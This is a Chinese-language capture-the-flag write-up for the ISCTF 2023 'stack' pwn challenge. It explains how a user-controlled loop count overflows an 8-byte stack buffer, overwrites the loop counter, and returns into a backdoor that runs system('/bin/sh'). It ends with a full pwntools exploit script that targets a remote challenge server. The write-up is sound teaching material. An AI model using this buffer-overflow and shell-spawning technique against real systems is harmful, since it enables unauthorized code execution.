# Pwn-stack
## 预处理
题目界面有一个下载文件，首先通过`checksec`工具查询文件权限：
```shell
checksec stack
[*] '/mnt/f/CTF/Writeup/ATS-Team/2023/isctf2023/Pwn/stack/stack'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

发现仅仅开启了NX保护（任意代码执行保护），于是我们将源程序反编译。

## 文件分析
首先可以发现一个名为 `backdoor` 的函数，我们发现其其为我们调用的后门函数。

然后我们分析关键函数 `vuln` , 反编译代码如下:

```c
__int64 vuln()
{
  int v1; // [rsp+Ch] [rbp-24h] BYREF
  char s[8]; // [rsp+10h] [rbp-20h] BYREF
  __int64 v3; // [rsp+18h] [rbp-18h]
  int i; // [rsp+2Ch] [rbp-4h]

  *(_QWORD *)s = 0LL;
  v3 = 0LL;
  i = 0;
  v1 = 0;
  printf("size: ");
  __isoc99_scanf("%d", &v1);
  printf("> ");
  for ( i = 0; i < v1; ++i )
  {
    read(0, &s[i], 1uLL);
    if ( s[i] == 10 )
      break;
  }
  puts(s);
  return 0LL;
}
```

我们发现我们的输入值可以控制循环的次数，而 `s` 数组仅有八个字节的空间，于是我们可以输入一个很大的数，然后不断的循环，造成栈溢出。

这里有两个需要注意的地方：

1. 在溢出时，我们会覆盖控制循环次数的地方(即 `i` ), 于是在覆盖时， 我们需要将其设置为我们需要的值（调试得 `0x24` ）
2. 在调用后门函数时，我们发现其在调用前存在堆栈平衡操作，而这样会导致错误。于是我们设置后门地址时跳过前面两行，将其设为 `0x4012ee`

`backdoor` 汇编如下：
```mipsasm
.text:00000000004012E6                               ; Attributes: bp-based frame
.text:00000000004012E6
.text:00000000004012E6                               ; int backdoor()
.text:00000000004012E6                               public backdoor
.text:00000000004012E6                               backdoor proc near
.text:00000000004012E6                               ; __unwind {
.text:00000000004012E6 F3 0F 1E FA                   endbr64
.text:00000000004012EA 55                            push    rbp
.text:00000000004012EB 48 89 E5                      mov     rbp, rsp
.text:00000000004012EE 48 8D 05 1C 0D 00 00          lea     rax, command                    ; "/bin/sh"
.text:00000000004012F5 48 89 C7                      mov     rdi, rax                        ; command
.text:00000000004012F8 B8 00 00 00 00                mov     eax, 0
.text:00000000004012FD E8 AE FD FF FF                call    _system
.text:00000000004012FD
.text:0000000000401302 90                            nop
.text:0000000000401303 5D                            pop     rbp
.text:0000000000401304 C3                            retn
.text:0000000000401304                               ; } // starts at 4012E6
.text:0000000000401304
.text:0000000000401304                               backdoor endp
```

于是我们构造出最终的 `payload` :
```python
# payload isctf2023-pwn-stack
from pwn import *

# r = process('./stack')
# change to your address
r = remote("43.249.195.138", 20472)
#backdoor address
sys_addr = 0x4012ee                     

r.recvuntil(b": ")
# input a big number(maybe bigger than 50)
r.sendline(b"100")                      
r.recvuntil(b">")
# payload: 0x24 is the number of i, which can directly covered rsp
payload = b"a" * (0x20 - 0x04) + p32(0x24) + p64(sys_addr)
# pause()
r.sendline(payload)
r.interactive()
```
运行脚本，即可获得 `flag` 。